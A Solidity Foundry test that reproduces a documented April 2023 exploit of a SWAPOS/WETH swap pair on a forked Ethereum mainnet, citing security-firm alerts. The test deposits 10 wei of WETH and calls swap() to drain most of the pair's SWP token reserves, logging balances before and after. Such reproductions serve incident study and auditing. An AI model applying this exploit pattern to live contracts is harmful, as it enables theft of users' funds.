// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/CertiKAlert/status/1647530789947469825
// https://twitter.com/BeosinAlert/status/1647552192243728385
// @TX
// https://etherscan.io/address/0x2df07c054138bf29348f35a12a22550230bd1405

// @Contract

interface SWAPOS {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;

    function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);

    function balanceOf(address) external view returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);
}

contract ContractTest is Test {
    SWAPOS swpToken = SWAPOS(0x09176F68003c06F190ECdF40890E3324a9589557);
    IWETH private constant WETH = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    SWAPOS swapPos = SWAPOS(0x8ce2F9286F50FbE2464BFd881FAb8eFFc8Dc584f);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 17_057_419);
        cheats.label(address(WETH), "weth");
        cheats.label(address(swpToken), "swpToken");
    }

    function testExploit() external {
        WETH.deposit{value: 1 ether}();
        WETH.transfer(address(swapPos), 10);
        uint112 reserve0;
        uint112 reserve1;
        uint256 k;
        (reserve0, reserve1,) = swapPos.getReserves();
        console2.log("reserve0 = %d reserve1 = %d", reserve0, reserve1);
        emit log_named_decimal_uint("swapos balance in this", IERC20(address(swpToken)).balanceOf(address(swapPos)), 18);
        emit log_named_decimal_uint("ETH balance in this", WETH.balanceOf(address(swapPos)), 18);
        //144057522011249890003621-144057 142_658_161_144_708_222_114_663-142658
        swapPos.swap(142_658_161_144_708_222_114_663, 0, address(this), "");
        (reserve0, reserve1,) = swapPos.getReserves();
        console2.log("reserve0 = %d reserve1 = %d", reserve0, reserve1);

        (uint256 _reserve0, uint256 _reserve1, uint32 _blockTimestampLast) = swapPos.getReserves();
        emit log_named_decimal_uint("swapos balance in pair", _reserve0, 18);
        emit log_named_decimal_uint("ETH balance in pari", _reserve1, 18);

        emit log_named_decimal_uint("swapos balance in this", IERC20(address(swpToken)).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("ETH balance in this", WETH.balanceOf(address(this)), 18);
    }
}
